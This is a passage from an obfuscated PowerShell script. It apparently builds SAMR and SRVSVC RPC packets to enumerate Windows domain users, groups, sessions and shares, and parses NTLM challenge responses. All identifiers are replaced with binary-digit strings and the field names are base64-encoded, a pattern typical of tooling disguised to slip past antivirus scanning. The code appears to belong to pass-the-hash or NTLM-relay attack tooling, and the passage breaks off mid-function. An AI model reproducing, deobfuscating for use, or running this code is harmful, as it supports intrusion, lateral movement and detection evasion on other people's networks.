    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASABhAG4AZABsAGUA'))),${_01001101111110010})
    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBJAEQAcwBfAFMASQBEAEEAcgByAGEAeQA='))),${_10000010010100100})
    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8AYwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBVAEwATABfAHAAbwBpAG4AdABlAHIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8AbABlAHYAZQBsAA=='))),[Byte[]](0x01,0x00))
    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00))
    ${00000101111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAHUAbgB0AF8AYwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${00000101111101000}
}
function _00011011000100100
{
    param([String]${_00100000100010100})
    [Byte[]]${00011011000011110} = [System.Text.Encoding]::Unicode.GetBytes(${_00100000100010100})
    [Byte[]]${00111100111001011} = [System.BitConverter]::GetBytes(${_00100000100010100}.Length + 1)
    if(${_00100000100010100}.Length % 2)
    {
        ${00011011000011110} += 0x00,0x00
    }
    else
    {
        ${00011011000011110} += 0x00,0x00,0x00,0x00
    }
    ${00111010110001111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111010110001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${00111010110001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE0AYQB4AEMAbwB1AG4AdAA='))),${00111100111001011})
    ${00111010110001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00111010110001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${00111100111001011})
    ${00111010110001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFMAeQBzAHQAZQBtAE4AYQBtAGUA'))),${00011011000011110})
    ${00111010110001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    return ${00111010110001111}
}
function _00000101101101011
{
    param([String]${_00100000100010100})
    ${_00100000100010100} = "\\" + ${_00100000100010100}
    [Byte[]]${00011011000011110} = [System.Text.Encoding]::Unicode.GetBytes(${_00100000100010100})
    [Byte[]]${00111100111001011} = [System.BitConverter]::GetBytes(${_00100000100010100}.Length + 1)
    if(${_00100000100010100}.Length % 2)
    {
        ${00011011000011110} += 0x00,0x00
    }
    else
    {
        ${00011011000011110} += 0x00,0x00,0x00,0x00
    }
    ${01001101100111011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE0AYQB4AEMAbwB1AG4AdAA='))),${00111100111001011})
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${00111100111001011})
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AHMAdABlAG0ATgBhAG0AZQBfAFMAeQBzAHQAZQBtAE4AYQBtAGUA'))),${00011011000011110})
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAHYAZQBsAEkAbgA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASQBuAGYAbwBJAG4AXwBTAEEATQBSAEMAbwBuAG4AZQBjAHQASQBuAGYAbwBfAEkAbgBmAG8ASQBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASQBuAGYAbwBJAG4AXwBTAEEATQBSAEMAbwBuAG4AZQBjAHQASQBuAGYAbwBfAEkAbgBmAG8ASQBuADEAXwBDAGwAaQBlAG4AdABWAGUAcgBzAGkAbwBuAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
    ${01001101100111011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ASQBuAGYAbwBJAG4AXwBTAEEATQBSAEMAbwBuAG4AZQBjAHQASQBuAGYAbwBfAEkAbgBmAG8ASQBuADEAXwBVAG4AawBuAG8AdwBuAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${01001101100111011}
}
function _00011011100101111
{
    param([Byte[]]${_01001101111110010})
    ${00000101110100111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00000101110100111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_01001101111110010})
    return ${00000101110100111}
}
function _10000000110101011
{
    param([Byte[]]${_01001101111110010})
    ${01101101001000010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101101001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_01001101111110010})
    return ${01101101001000010}
}
function _10111111010100000
{
    param([Byte[]]${_01001101111110010},[Byte[]]${_01110000100011010})
    ${01101111010000000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01101111010000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_01001101111110010})
    ${01101111010000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${01101111010000000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBJAEQA'))),${_01110000100011010})
    return ${01101111010000000}
}
function _01000100001110110
{
    param([Byte[]]${_01001101111110010},[Byte[]]${_01110000100011010})
    ${01110000111100010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110000111100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_01001101111110010})
    ${01110000111100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${01110000111100010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBJAEQA'))),${_01110000100011010})
    return ${01110000111100010}
}
function _10111111001000000
{
    param([Byte[]]${_01001101111110010})
    ${01111101001100000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01111101001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARwByAG8AdQBwAEgAYQBuAGQAbABlAA=='))),${_01001101111110010})
    return ${01111101001100000}
}
function _10100101111111101
{
    param([Byte[]]${_01001101111110010},[Byte[]]${_10011010010111111},[Byte[]]${_10001000011110110})
    ${00111010010110110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00111010010110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBvAG4AbgBlAGMAdABIAGEAbgBkAGwAZQA='))),${_01001101111110010})
    ${00111010010110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x00,0x00,0x00,0x02))
    ${00111010010110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBpAGQAXwBDAG8AdQBuAHQA'))),${_10011010010111111})
    ${00111010010110110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBpAGQAXwBTAGkAZAA='))),${_10001000011110110})
    return ${00111010010110110}
}
function _01010000101111000
{
    param([Byte[]]${_01001101111110010})
    ${10100100101011101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10100100101011101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARABvAG0AYQBpAG4ASABhAG4AZABsAGUA'))),${_01001101111110010})
    ${10100100101011101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAHMAdQBtAGUASABhAG4AZABsAGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10100100101011101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAdABGAGwAYQBnAHMA'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${10100100101011101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUwBpAHoAZQA='))),[Byte[]](0xff,0xff,0x00,0x00))
    return ${10100100101011101}
}
function _10111010110110110
{
    param([Byte[]]${_01001101111110010},[String]${_00011010001010111})
    [Byte[]]${10100100000011101} = [System.Text.Encoding]::Unicode.GetBytes(${_00011010001010111})
    [Byte[]]${00010110100011000} = ([System.BitConverter]::GetBytes(${10100100000011101}.Length))[0,1]
    [Byte[]]${00111100111001011} = [System.BitConverter]::GetBytes(${_00011010001010111}.Length)
    ${10010010010001110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARABvAG0AYQBpAG4ASABhAG4AZABsAGUA'))),${_01001101111110010})
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0ATgBhAG0AZQBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),[Byte[]](0xe8,0x03,0x00,0x00))
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBMAGUAbgA='))),${00010110100011000})
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBTAGkAegBlAA=='))),${00010110100011000})
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAE0AYQB4AEMAbwB1AG4AdAA='))),${00111100111001011})
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),${00111100111001011})
    ${10010010010001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATgBhAG0AZQBzAF8ATgBhAG0AZQBzAF8ATgBhAG0AZQBfAE4AYQBtAGUAcwA='))),${10100100000011101})
    return ${10010010010001110}
}
function _00001110110100000
{
    param([Byte[]]${_01001101111110010},[Byte[]]${_00011011111001101},[Byte[]]${_00100000100111010})
    ${00100011001000010} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100011001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ARABvAG0AYQBpAG4ASABhAG4AZABsAGUA'))),${_01001101111110010})
    ${00100011001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AUgBpAGQAcwA='))),${_00011011111001101})
    ${00100011001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0xe8,0x03,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00100011001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AUgBpAGQAcwAyAA=='))),${_00011011111001101})
    ${00100011001000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGQAcwA='))),${_00100000100111010})
    return ${00100011001000010}
}
function _10000000101011000
{
    param([String]${_00010011100101000})
    [Byte[]]${10000001101001011} = [System.Text.Encoding]::Unicode.GetBytes(${_00010011100101000})
    [Byte[]]${00111100111001011} = [System.BitConverter]::GetBytes(${_00010011100101000}.Length + 1)
    if(${_00010011100101000}.Length % 2)
    {
        ${10000001101001011} += 0x00,0x00
    }
    else
    {
        ${10000001101001011} += 0x00,0x00,0x00,0x00
    }
    ${10101101110111000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBNAGEAeABDAG8AdQBuAHQA'))),${00111100111001011})
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),${00111100111001011})
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBTAGUAcgB2AGUAcgBVAE4AQwA='))),${10000001101001011})
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x04,0x00,0x02,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBNAGEAeABDAG8AdQBuAHQA'))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwBsAGkAZQBuAHQAXwBDAGwAaQBlAG4AdAA='))),[Byte[]](0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgA='))),[Byte[]](0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAFIAZQBmAGUAcgBlAG4AdABJAEQA'))),[Byte[]](0x08,0x00,0x02,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAE0AYQB4AEMAbwB1AG4AdAA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAEEAYwB0AHUAYQBsAEMAbwB1AG4AdAA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AVQBzAGUAcgBfAFUAcwBlAHIA'))),[Byte[]](0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABlAHYAZQBsAA=='))),[Byte[]](0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABlAHYAZQBsAF8ATABlAHYAZQBsAA=='))),[Byte[]](0x0a,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AQwB0AHIA'))),[Byte[]](0x0a,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AUABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAMQAwAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x0c,0x00,0x02,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AUABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAMQAwAF8AQwB0AHIAMQAwAF8AQwBvAHUAbgB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGUAcwBzAEMAdAByAF8AUABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAMQAwAF8AQwB0AHIAMQAwAF8ATgB1AGwAbABQAG8AaQBuAHQAZQByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff,0xff,0xff))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAHMAdQBtAGUASABhAG4AZABsAGUAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x10,0x00,0x02,0x00))
    ${10101101110111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAHMAdQBtAGUASABhAG4AZABsAGUAXwBSAGUAcwB1AG0AZQBIAGEAbgBkAGwAZQA='))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${10101101110111000}
}
function _00011011000001011
{
    param([String]${_00010011100101000})
    ${_00010011100101000} = "\\" + ${_00010011100101000}
    [Byte[]]${10000001101001011} = [System.Text.Encoding]::Unicode.GetBytes(${_00010011100101000})
    [Byte[]]${00111100111001011} = [System.BitConverter]::GetBytes(${_00010011100101000}.Length + 1)
    if(${_00010011100101000}.Length % 2)
    {
        ${10000001101001011} += 0x00,0x00
    }
    else
    {
        ${10000001101001011} += 0x00,0x00,0x00,0x00
    }
    ${01001111110100001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBSAGUAZgBlAHIAZQBuAHQASQBEAA=='))),[Byte[]](0x00,0x00,0x02,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBNAGEAeABDAG8AdQBuAHQA'))),${00111100111001011})
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),${00111100111001011})
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwBlAHIAdgBlAHIAVQBOAEMAXwBTAGUAcgB2AGUAcgBVAE4AQwA='))),${10000001101001011})
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABlAHYAZQBsAF8ATABlAHYAZQBsAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBDAHQAcgA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBQAG8AaQBuAHQAZQByAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x04,0x00,0x02,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBQAG8AaQBuAHQAZQByAF8AQwB0AHIAMQBfAEMAbwB1AG4AdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AQwB0AHIAXwBOAGUAdABTAGgAYQByAGUAQwB0AHIAXwBQAG8AaQBuAHQAZQByAF8ATgB1AGwAbABQAG8AaQBuAHQAZQByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAQgB1AGYAZgBlAHIA'))),[Byte[]](0xff,0xff,0xff,0xff))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgB0AEkARAA='))),[Byte[]](0x08,0x00,0x02,0x00))
    ${01001111110100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBtAGUASABhAG4AZABsAGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${01001111110100001}
}
}
${10111010001100000} =
{
    function _01001010000101001
    {
        param ([Byte[]]${_10010000001111011})
        ${01001100100110100} = [System.BitConverter]::ToString(${_10010000001111011})
        ${01001100100110100} = ${01001100100110100} -replace "-",""
        ${00010001011000101} = ${01001100100110100}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        if(${01001100100110100}.SubString((${00010001011000101} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyADAAMAAwADAAMAAwAA=='))))
        {
            ${10010001111000000} = ${01001100100110100}.SubString((${00010001011000101} + 48),16)
        }
        ${10101000100001000} = _01100110110110101 ((${00010001011000101} + 24) / 2) ${_10010000001111011}
        ${01110100001011010} = [System.Convert]::ToInt16((${01001100100110100}.SubString((${00010001011000101} + 44),2)),16)
        ${01110100001011010} = [Convert]::ToString(${01110100001011010},2)
        ${00001101011101101} = ${01110100001011010}.SubString(0,1)
        if(${00001101011101101} -eq 1)
        {
            ${01111010001000100} = (${00010001011000101} + 80) / 2
            ${01111010001000100} = ${01111010001000100} + ${10101000100001000} + 16
            ${00011101110001011} = ${_10010000001111011}[${01111010001000100}]
            ${10000101000101100} = 0
            while(${00011101110001011} -ne 0 -and ${10000101000101100} -lt 10)
            {
                ${10001101011000100} = _01100110110110101 (${01111010001000100} + 2) ${_10010000001111011}
                switch(${00011101110001011}) 
                {
                    2
                    {
